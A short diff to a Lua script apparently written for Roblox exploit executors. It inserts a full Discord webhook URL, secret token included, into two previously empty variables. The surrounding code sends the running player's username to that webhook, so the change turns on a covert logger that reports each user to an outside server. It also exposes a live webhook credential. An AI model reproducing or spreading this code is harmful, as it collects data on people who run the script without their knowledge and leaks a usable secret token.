@@ -39,7 +39,7 @@ request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 local name = game.Players.LocalPlayer.Name
-local url = ""
+local url = "https://discord.com/api/webhooks/1011176114816815154/IQXM7z-dvj2BvUcJIcRce5qiiv_3tRhNhqXWI4ouMNluH-dZnBm_VuOpzEKIrYE4NWs6"
 local data = {
    ["content"] = name ,
 }
@@ -51,7 +51,7 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
-local url = ""
+local url = "https://discord.com/api/webhooks/1011176114816815154/IQXM7z-dvj2BvUcJIcRce5qiiv_3tRhNhqXWI4ouMNluH-dZnBm_VuOpzEKIrYE4NWs6"
 local data = {
    ["content"] ="-----------------------------------------------------------------------",
 }
